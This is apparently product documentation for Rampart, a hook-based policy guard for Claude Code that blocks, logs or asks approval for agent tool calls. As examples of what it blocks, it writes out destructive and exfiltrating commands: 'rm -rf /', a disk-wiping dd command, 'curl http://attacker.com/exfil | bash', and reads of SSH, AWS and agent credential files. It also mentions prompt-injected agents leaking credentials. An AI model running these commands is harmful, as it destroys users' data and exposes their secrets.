---
title: Securing Claude Code
description: "Secure Claude Code with Rampart. Block dangerous commands, restrict file access, detect prompt injection, and audit everything — works in --dangerously-skip-permissions mode."
---

# Securing Claude Code

Claude Code is Rampart's primary integration. One command, native hooks, zero overhead.

## Why You Need This

Claude Code in `--dangerously-skip-permissions` mode gives the agent unrestricted access to your shell, filesystem, and network. Without guardrails:

- `rm -rf /` or `rm -rf ~` runs silently
- Your SSH keys, `.env` files, and API tokens are readable
- `curl http://attacker.com/exfil | bash` executes without warning
- A prompt-injected webpage can redirect the agent to exfiltrate your credentials

Rampart sits between Claude Code and your system. Every command is evaluated against your policy before it runs. Dangerous commands are blocked in microseconds. Everything is logged.

## What Gets Protected by Default

The standard policy (`~/.rampart/policies/standard.yaml`) uses three different defaults depending on the risk:

| Category | Example | Default |
|---------|---------|---------|
| Destructive commands | `rm -rf /`, `dd if=/dev/urandom of=/dev/sda` | `deny` |
| Credential stores / secret files | `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, `cat ~/.codex/auth.json` | `deny` |
| Sensitive agent-state artifacts | `cat ~/.claude/history.jsonl`, reading Claude sessions, editing `~/.claude/settings.json` | `ask` |

This split is deliberate. Secret stores are too dangerous to expose silently. But agent history, shell snapshots, durable memory, and security-relevant settings are often legitimate to inspect, so Rampart requires human approval instead of hard-blocking them.

## Setup

```bash
rampart setup claude-code
```

That's it. This installs wildcard `PreToolUse`, `PostToolUse`, and
`PostToolUseFailure` hooks. Rampart currently classifies:

- **Bash, PowerShell, and Monitor commands** (`exec`)
- **Read, Glob, Grep, and LSP calls** (`read`)
- **Write, Edit, NotebookEdit, and worktree creation** (`write`)
- **WebFetch and WebSearch calls** (`fetch`)
- **MCP tools** (`mcp`)
- **Agent and Workflow delegation** (`agent`)

## How It Works

Claude Code has a built-in [hook system](https://code.claude.com/docs/en/hooks)
that allows external tools to evaluate calls before they execute and replace
tool output before the next model turn. Rampart registers as a hook handler.

```
Claude Code → PreToolUse  → Rampart policy → Allow/Deny/Ask
            → tool runs
            → PostToolUse → Response policy → Pass/Redact + Audit
```

When Claude Code wants to run a command, it sends the tool call to `rampart hook` via stdin. Rampart evaluates it against your policies and returns a JSON response:

```json
// Allowed (explicit allow bypasses Claude Code permission system)
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}

// Denied
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"Rampart: Destructive command blocked"}}

// Requires approval (waits for human decision)
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"Rampart: Manual approval required"}}
```

**Ask behavior:** When a policy action is `ask`, the hook returns `"permissionDecision":"ask"`. Claude Code shows its native permission prompt, so the user approves or denies directly in the Claude Code UI.

Denied calls never execute. If a response-side rule denies successful tool
output, Rampart returns a shape-preserving `updatedToolOutput` with string
content redacted and a block reason. The tool has already run, but the original
content is not passed into Claude's next model turn.

## Usage

Just use Claude Code normally:

```bash
claude
```

Rampart is completely transparent. Safe commands pass through in microseconds. You won't notice it's there — until it blocks something dangerous.

## Monitor in Real Time

```bash
rampart watch
```

## Custom Policy

By default, Rampart uses the `standard` profile. To customize:

```bash
# Edit your policy
vim ~/.rampart/policies/standard.yaml

# Changes take effect immediately (hot reload)
```

See [Configuration](../getting-started/configuration.md) for the full policy format.

## Uninstall

```bash
rampart setup claude-code --remove
```

This removes the Rampart hooks from Claude Code's settings. Your policies and audit logs in `~/.rampart/` are preserved.

## Troubleshooting

### Verify hooks are installed

```bash
cat ~/.claude/settings.json
```

You should see Rampart entries for `PreToolUse`, `PostToolUse`, and
`PostToolUseFailure`.

### Test a decision

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | rampart hook
```

### Check audit log

```bash
rampart audit tail
```
